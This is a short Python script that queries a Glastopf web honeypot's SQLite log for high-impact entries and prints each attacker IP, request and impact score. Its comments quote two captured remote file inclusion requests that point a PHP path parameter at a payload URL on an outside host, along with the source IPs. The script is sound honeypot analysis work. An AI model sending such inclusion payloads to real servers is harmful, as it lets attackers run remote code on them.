#!/usr/bin/python
#import sqlite3 

# id timestamp attacker request impact
import sys
from pysqlite2 import dbapi2 as sqlite3

database = '/usr/local/src/GlastopfNG/modules/report/sqLite/sqLitedb.db'
conn = sqlite3.connect(database)
curs = conn.cursor()

#query = 'SELECT * from log'
query = 'SELECT id,attacker,request,impact from log WHERE impact >= 30 ORDER BY impact'
print query

curs.execute(query)

#(330, u'187.61.61.231', u'//inc/formmail.inc.php?script_root=?includes/kb_constants.php?module_root_pathhttp://www.team-rig.com/afiles/define/response.txt?', 30)
#id : 330
#attacker : 187.61.61.231
#request : //inc/formmail.inc.php?script_root=?includes/kb_constants.php?module_root_pathhttp://www.team-rig.com/afiles/define/response.txt?
#impact : 30
#
#(331, u'218.188.39.57', u'//inc/formmail.inc.php?script_root=?includes/kb_constants.php?module_root_pathhttp://www.team-rig.com/afiles/define/response.txt?', 30)
#id : 331
#attacker : 218.188.39.57
#request : //inc/formmail.inc.php?script_root=?includes/kb_constants.php?module_root_pathhttp://www.team-rig.com/afiles/define/response.txt?
#impact : 30

names = [f[0] for f in curs.description]
for row in curs.fetchall():
    id       = row[0]
    attacker = row[1]
    request  = row[2]
    impact   = row[3]
    
    print "srcIP   = " + attacker.__str__()
    print "  request = " + request.__str__()
    print "  impact  = " + impact.__str__()    
    print 
    #for pair in zip(names, row):
    #    print '%s : %s' % pair
    #print
    
        